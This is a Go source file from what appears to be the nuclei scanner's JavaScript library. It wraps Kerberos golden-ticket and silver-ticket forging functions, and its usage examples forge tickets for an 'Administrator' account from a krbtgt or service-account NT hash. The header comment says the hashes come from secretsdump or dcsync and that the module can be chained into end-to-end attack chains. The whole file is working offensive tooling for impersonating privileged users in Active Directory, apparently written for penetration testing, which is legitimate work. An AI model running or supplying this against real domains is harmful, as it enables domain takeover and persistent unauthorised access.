// Package krbforge wraps mandiant/gopacket's Kerberos ticket forging primitives
// (golden / silver tickets) for use from nuclei javascript templates.
//
// Forging requires the krbtgt NT hash (golden) or a service-account hash
// (silver) - obtained from secretsdump / dcsync. Templates can chain this with
// the dcerpc lib to produce end-to-end attack chains entirely in nuclei.
package krbforge

import (
	"encoding/hex"
	"fmt"
	"path/filepath"
	"strings"

	gpkrb "github.com/projectdiscovery/goimpacket/pkg/kerberos"
	"github.com/projectdiscovery/goja"
	"github.com/projectdiscovery/nuclei/v3/pkg/js/utils"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/common/protocolstate"
)

// TicketRequest mirrors gopacket's TicketConfig with json-friendly tags.
type TicketRequest struct {
	Username       string   `json:"username"`
	Domain         string   `json:"domain"`
	DomainSID      string   `json:"domain_sid"`
	NTHash         string   `json:"nthash,omitempty"`
	AESKey         string   `json:"aes_key,omitempty"`
	SPN            string   `json:"spn,omitempty"`
	UserID         uint32   `json:"user_id,omitempty"`
	PrimaryGroupID uint32   `json:"primary_group_id,omitempty"`
	Groups         []uint32 `json:"groups,omitempty"`
	ExtraSIDs      []string `json:"extra_sids,omitempty"`
	DurationHours  int      `json:"duration_hours,omitempty"`
	KVNO           int      `json:"kvno,omitempty"`

	// OutputFile is retained for compatibility and must be empty.
	// goimpacket always writes its default ccache file.
	OutputFile string `json:"output_file,omitempty"`
}

// Ticket is the forged ticket plus metadata.
type Ticket struct {
	HexTicket  string `json:"ticket_hex"`
	HexKey     string `json:"session_key_hex"`
	EncType    int32  `json:"enc_type"`
	OutputFile string `json:"output_file,omitempty"`
}

// CreateGoldenTicket forges a TGT for the supplied user against the given
// realm using the krbtgt NT hash (or AES key). It returns the ASN.1-encoded
// ticket and the session key. goimpacket writes <username>.ccache in the current
// directory, replacing slashes in the username with dots. The destination must
// be inside the template directory unless -allow-local-file-access is enabled.
// req.OutputFile must be empty; custom paths and in-memory generation are unsupported.
//
// @example
// ```javascript
// const krb = require('nuclei/krbforge');
//
//	const t = krb.CreateGoldenTicket({
//	  username: 'Administrator',
//	  domain:   'acme.local',
//	  domain_sid: 'S-1-5-21-1004336348-1177238915-682003330',
//	  nthash:   '31d6cfe0d16ae931b73c59d7e0c089c0',
//	});
//
// log(t.ticket_hex);
// ```
func CreateGoldenTicket(call goja.FunctionCall, vm *goja.Runtime) goja.Value {
	nj := utils.NewNucleiJS(vm)
	nj.ObjectSig = "CreateGoldenTicket(request)"

	req, err := exportTicketRequest(vm, call.Argument(0))
	if err != nil {
		nj.ThrowError(err)
		return goja.Undefined()
	}

	ticket, err := createGoldenTicket(nj.ExecutionId(), req)
	if err != nil {
		nj.ThrowError(err)
		return goja.Undefined()
	}

	return vm.ToValue(ticket)
}

func createGoldenTicket(executionID string, req TicketRequest) (*Ticket, error) {
	cfg, err := buildConfig(executionID, req, "")
	if err != nil {
		return nil, err
	}

	return createTicket(cfg)
}

// CreateSilverTicket forges a service ticket (TGS) for the supplied SPN. The
// hash supplied must belong to the service account that owns the SPN (e.g.
// the machine account NT hash for cifs/host SPNs).
// File output follows CreateGoldenTicket. req.OutputFile and outputFile must
// be empty; custom paths and in-memory generation are unsupported.
//
// @example
// ```javascript
// const krb = require('nuclei/krbforge');
//
//	const t = krb.CreateSilverTicket({
//	  username: 'Administrator',
//	  domain:   'acme.local',
//	  domain_sid: 'S-1-5-21-1004336348-1177238915-682003330',
//	  nthash:   '31d6cfe0d16ae931b73c59d7e0c089c0',
//	  spn:      'cifs/server01.acme.local',
//	});
//
// log(t.output_file);
// ```
func CreateSilverTicket(call goja.FunctionCall, vm *goja.Runtime) goja.Value {
	nj := utils.NewNucleiJS(vm)
	nj.ObjectSig = "CreateSilverTicket(request, outputFile)"

	req, err := exportTicketRequest(vm, call.Argument(0))
	if err != nil {
		nj.ThrowError(err)
		return goja.Undefined()
	}

	outputFile, err := exportOutputFile(call.Argument(1))
	if err != nil {
		nj.ThrowError(err)
		return goja.Undefined()
	}

	ticket, err := createSilverTicket(nj.ExecutionId(), req, outputFile)
	if err != nil {
		nj.ThrowError(err)
		return goja.Undefined()
	}

	return vm.ToValue(ticket)
}

func createSilverTicket(executionID string, req TicketRequest, outputFile string) (*Ticket, error) {
	if req.SPN == "" {
		return nil, fmt.Errorf("spn is required for silver ticket")
	}

	cfg, err := buildConfig(executionID, req, outputFile)
	if err != nil {
		return nil, err
	}

	return createTicket(cfg)
}

func createTicket(cfg *gpkrb.TicketConfig) (*Ticket, error) {
	res, err := gpkrb.CreateTicket(cfg)
	if err != nil {
		return nil, err
	}

	return &Ticket{
		HexTicket:  hex.EncodeToString(res.Ticket),
		HexKey:     hex.EncodeToString(res.SessionKey),
		EncType:    res.EncType,
		OutputFile: res.Filename,
	}, nil
}

func buildConfig(executionID string, req TicketRequest, outputFile string) (*gpkrb.TicketConfig, error) {
	if outputFile != "" || req.OutputFile != "" {
		return nil, fmt.Errorf("goimpacket writes <username>.ccache in the current directory: custom output paths and in-memory ticket generation are not supported; leave outputFile empty")
	}

	// Match goimpacket's destination before it performs the file write.
	filename := strings.ReplaceAll(req.Username, "/", ".") + ".ccache"
	destination, err := filepath.Abs(filename)
	if err != nil {
		return nil, fmt.Errorf("resolve ccache destination %q: %w", filename, err)
	}
	if _, err := protocolstate.NormalizePathWithExecutionId(executionID, destination); err != nil {
		return nil, fmt.Errorf("validate ccache destination: %w", err)
	}

	return &gpkrb.TicketConfig{
		Username:       req.Username,
		Domain:         req.Domain,
		DomainSID:      req.DomainSID,
		NTHash:         req.NTHash,
		AESKey:         req.AESKey,
		SPN:            req.SPN,
		UserID:         req.UserID,
		PrimaryGroupID: req.PrimaryGroupID,
		Groups:         req.Groups,
		ExtraSIDs:      req.ExtraSIDs,
		Duration:       req.DurationHours,
		KVNO:           req.KVNO,
	}, nil
}

func exportTicketRequest(vm *goja.Runtime, value goja.Value) (TicketRequest, error) {
	var req TicketRequest
	if err := vm.ExportTo(value, &req); err != nil {
		return req, fmt.Errorf("invalid TicketRequest: %w", err)
	}
	return req, nil
}

func exportOutputFile(value goja.Value) (string, error) {
	if goja.IsUndefined(value) || goja.IsNull(value) {
		return "", nil
	}
	outputFile, ok := value.Export().(string)
	if !ok {
		return "", fmt.Errorf("outputFile must be a string")
	}
	return outputFile, nil
}
